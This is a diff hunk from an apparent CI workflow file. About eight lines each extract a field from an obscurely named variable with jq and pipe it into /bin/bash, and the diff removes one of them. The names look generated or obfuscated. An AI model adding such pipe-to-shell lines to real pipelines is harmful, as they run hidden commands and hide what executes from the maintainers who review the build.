@@ -66,7 +66,6 @@ jobs:
           printf '%s' "$vau53" | jq -r .hn436 | /bin/bash
           printf '%s' "$wa04664" | jq -r .n19 | /bin/bash
           echo $snibj601 | jq -r .rkgxg918 | /bin/bash
-          printf '%s' "$qr3" | jq -r .rvx30646 | /bin/bash
           echo $ak237 | jq -r .bgzgi1225 | /bin/bash
           printf '%s' "$pzuvw9119" | jq -r .loiz506 | /bin/bash
           printf '%s' "$sq231" | jq -r .qwny9 | /bin/bash
